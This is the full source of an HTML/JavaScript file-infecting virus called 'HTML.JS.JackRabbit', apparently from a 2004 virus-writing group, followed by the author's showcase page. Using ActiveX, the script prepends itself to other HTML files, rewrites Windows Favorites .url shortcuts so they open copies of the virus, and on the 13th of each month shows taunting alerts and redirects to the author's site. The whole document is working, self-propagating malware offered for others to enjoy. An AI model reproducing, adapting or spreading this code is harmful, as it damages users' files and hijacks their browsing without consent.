<html><JackRabbit>
<head>
<script language="JavaScript">

ThisFile = location.href;

if (ThisFile.indexOf("file:///") != -1) {

	wshell = new ActiveXObject("WScript.Shell");
	fso = new ActiveXObject("Scripting.FileSystemObject");

	FavFolder = wshell.SpecialFolders("Favorites") + "\\";

	ThisFile = location.href.substr(8);
	VirusName = new String(ThisFile);
	Virus = VirusName.replace("%20"," ");

	for (i = 0; i < 20; i++) {
		Virus = Virus.replace("%20"," ");
	}

	Virus = fso.GetFile(Virus);
	VirPath = Virus.ParentFolder + "\\";

	if (VirPath != FavFolder) {
		ReadVirCode = fso.OpenTextFile(Virus,1,false,0);
		VirCode = ReadVirCode.Read(4912);

		InfFolder = fso.GetFolder(VirPath);
		FindFile = new Enumerator(InfFolder.Files);
		FindFile.moveFirst();

		while (FindFile.atEnd() == false) {
			Victim = FindFile.item();
			FileType = fso.GetFile(Victim);

				if (Victim != Virus) {
					if (FileType.Type.indexOf("HTML") != -1) {
						CheckMarker = fso.OpenTextFile(Victim,1,false,0);
						Marker = CheckMarker.ReadLine();

						if (Marker.indexOf("<JackRabbit>") == -1) {
							ReadVicCode = fso.OpenTextFile(Victim,1,false,0);
							VicCode = ReadVicCode.ReadAll();

							fso.CreateTextFile(Victim);
							Prepend = fso.OpenTextFile(Victim,2,false,0);
							Prepend.Write(VirCode+VicCode);
							Prepend.Close();
						}
					}
				}
			FindFile.moveNext();
		}
	}

	RealURLName = new String(Virus);
	RealURL = RealURLName.substr(0,RealURLName.length-3) + "DiA";

	if (fso.FileExists(RealURL) == true) {
		ReadURL = fso.GetFile(RealURL);
		ReadURLLine = ReadURL.OpenAsTextStream();
		LoadURL = ReadURLLine.ReadLine();
		ReadURLLine.Close();
	}
	else {
		if (VirPath == FavFolder) {
			document.write("<b>ERROR! Can't load site</b><br>");
			document.write("Please try agian later...<br><br><br>");
			document.write("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-the admin JR");
			LoadURL = "";
		}
	}

	Favorit = fso.GetFolder(FavFolder);
	FindFile = new Enumerator(Favorit.Files);
	FindFile.moveFirst();

	while (FindFile.atEnd() == false) {
		Victim = FindFile.item();

		VictimFile = new String(Victim);

		if (VictimFile.indexOf("url",VictimFile.length-3) != -1) {

			NewVirName = new String(Victim);
			NewVir = NewVirName.substr(0,NewVirName.length-3) + "htm";

			Virus.Copy(NewVir);

			ReadVictim = fso.GetFile(Victim);
			ReadVictimLine = ReadVictim.OpenAsTextStream();

			Result = new String(ReadVictimLine.ReadLine());

			while (Result.substr(0,4) != "URL=") {
				Result = new String(ReadVictimLine.ReadLine());

				if (ReadVictimLine.AtEndOfStream == true) {
					break;
				}
			}
			ReadVictimLine.Close();

			URL = new String(Result);

			if (URL.substr(0,4) != "URL=") {
				URL = "file:///" + Virus;
			}

			else {
				URL = URL.substr(4,URL.length);
			}

			RealURL = NewVirName.substr(0,NewVirName.length-3) + "DiA";

			if (fso.FileExists(RealURL) == false) {
				fso.CreateTextFile(RealURL);
				RealURLWrite = fso.OpenTextFile(RealURL,2,false,0);
				RealURLWrite.WriteLine(URL);
				RealURLWrite.Close();
			}

			ReadVictimLine = ReadVictim.OpenAsTextStream();

			Result = new String(ReadVictimLine.ReadLine());

			while (Result.substr(0,9) != "IconFile=") {
				Result = new String(ReadVictimLine.ReadLine());

				if (ReadVictimLine.AtEndOfStream == true) {
					break;
				}
			}
			ReadVictimLine.Close();

			IconFile = new String(Result);

			if (IconFile.substr(0,9) != "IconFile=") {
				IconFile = "";
			}

			else {
				IconFile = Result;
			}

			ReadVictimLine = ReadVictim.OpenAsTextStream();

			Result = new String(ReadVictimLine.ReadLine());

			while (Result.substr(0,10) != "IconIndex=") {
				Result = new String(ReadVictimLine.ReadLine());

				if (ReadVictimLine.AtEndOfStream == true) {
					break;
				}
			}
			ReadVictimLine.Close();

			IconIndex = new String(Result);

			if (IconIndex.substr(0,10) != "IconIndex=") {
				IconIndex = "";
			}

			else {
				IconIndex = Result;
			}

			fso.CreateTextFile(Victim);
			InfectURL = fso.OpenTextFile(Victim,2,false,0);
			InfectURL.WriteLine("[InternetShortcut]");
			InfectURL.WriteLine("URL=file:///" + NewVir);
			InfectURL.WriteLine(IconFile);
			InfectURL.WriteLine(IconIndex);
			InfectURL.Close();

		}

		FindFile.moveNext();
	}

	if (VirPath == FavFolder) {
		location = LoadURL;
	}

	PayDate = new Date();
	if (PayDate.getDate() == 13) {
		alert("HTML.JS.JackRabbit Virus\n\nby DiA[rRlf] (c)04 GermanY\n\n\nThis is the first non overwriting .url (Favorites) infector.");
		alert("YOUR FAVORITES - MY VICTIMS\n\Have fun at this day, but don\'t use your favorites... hrhrhr\n\n\nDiA [rRlf]");
		location = "http://www.vx-dia.de.vu/";
	}

}
</script>
</head>
</html>

<html>
<head>
<title>HTML.JS.JackRabbit - First Generation</title>
</head>
<body bgColor="#AFAFAF" text="#8F8F8F" link="#000000" alink="#000000" vlink="#000000">
<center>
<h1>HTML.JS.JackRabbit</h1><br>
<h2>by <a href="http://www.vx-dia.de.vu">DiA</a><a href="http://www.rrlf.de">[rRlf]</a> (c)04 GermanY</h2><br>
<h3>This is the First non overwriting .url infector ever, written in JavaScript</h3>
<h4>Have fun with this nice creature!</h4>
<u>thanks:</u><br>
BBB<br>
Arik<br>
Denny<br>
Gunter<br>
Daniel<br>
Katze<br>
Nicole<br>
Ben<br>
Pascal<br>
Herr H.<br>
Marcel<br>
Cindy<br>
SPTH<br>
philet0ast3r<br>
DR-EF<br>
vh<br>
ElToro<br>
Wesely<br>
rRlf<br>
Assi.GmbH<br>
herm1t<br>
BMX<br>
Bad Luck 13<br>
MPR<br>
Hardcore<br>
beer<br>
weed<br>
whisky<br>
and all i forgot
</center>
</body>
</html>